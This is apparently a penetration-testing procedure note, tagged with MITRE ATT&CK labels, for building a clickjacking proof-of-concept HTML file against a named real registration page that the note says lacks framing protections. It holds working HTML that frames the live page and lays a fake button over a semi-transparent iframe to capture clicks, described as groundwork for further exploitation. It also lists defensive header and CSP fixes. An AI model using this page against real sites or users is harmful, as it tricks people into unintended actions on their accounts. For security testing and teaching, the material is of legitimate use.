---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - clickjacking
  - poc
  - html
  - iframe
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:28:05.408Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create-Clickjacking-POC-HTML-File

## Summary

This procedure creates a proof-of-concept (PoC) HTML file that embeds a target webpage in an iframe, demonstrating susceptibility to Clickjacking by allowing unrestricted framing.

## Description

Clickjacking involves tricking users into clicking on invisible or overlaid elements by embedding the target page in an iframe on a malicious site. In this case, the Pushwoosh registration page at https://go.pushwoosh.com/register lacks proper frame-busting protections like X-Frame-Options or Content-Security-Policy (CSP) with frame-ancestors directives. Although JavaScript may detect iframe embedding, it does not prevent rendering, enabling attackers to overlay transparent elements to capture clicks on sensitive actions like form submissions. This procedure focuses on generating the initial PoC HTML file for testing.

## Requirements

1. Access to a text editor (e.g., Notepad, VS Code)
2. Local file system access to save the HTML file
3. Knowledge of basic HTML syntax

## Defense

Defensive measures and detection strategies:

- Implement X-Frame-Options: DENY or SAMEORIGIN header on the server
- Use CSP with frame-ancestors 'none' or 'self' directive
- Monitor for unusual iframe embedding attempts via web application firewall (WAF)

## Objectives

1. Produce a functional HTML PoC for iframe embedding
2. Verify the target's lack of framing protections
3. Set up for further UI redressing exploitation

## Instructions

### Step 1: Set Up HTML Structure

**Context**: Begin by creating a new file and adding the basic iframe element to source the vulnerable URL.

No command execution required; use a text editor to write:

```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
</head>
<body>
    <iframe sandbox="allow-scripts allow-forms" src="https://go.pushwoosh.com/register" width="1000" height="600"></iframe>
</body>
</html>
```

> This HTML uses the sandbox attribute to allow scripts and forms, mimicking a realistic attack scenario. Save as `index.html`.

### Step 2: Customize for Attack Simulation

**Context**: Optionally add overlay elements to simulate the full clickjacking attack, such as a transparent div over a fake button.

Enhance the body with:

```html
<div style="position: absolute; top: 0; left: 0; width: 1000px; height: 600px;">
    <button style="position: absolute; top: 200px; left: 400px; z-index: 1;">Click Here (Fake)</button>
</div>
<iframe sandbox="allow-scripts allow-forms" src="https://go.pushwoosh.com/register" width="1000" height="600" style="opacity: 0.5; z-index: 0;"></iframe>
```

> This overlays a visible fake button on a semi-transparent iframe, tricking clicks to the underlying register button. Expected outcome: File ready for browser testing.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[clickjacking]]
- [[ui-redressing]]
- [[web]]
- [[poc]]
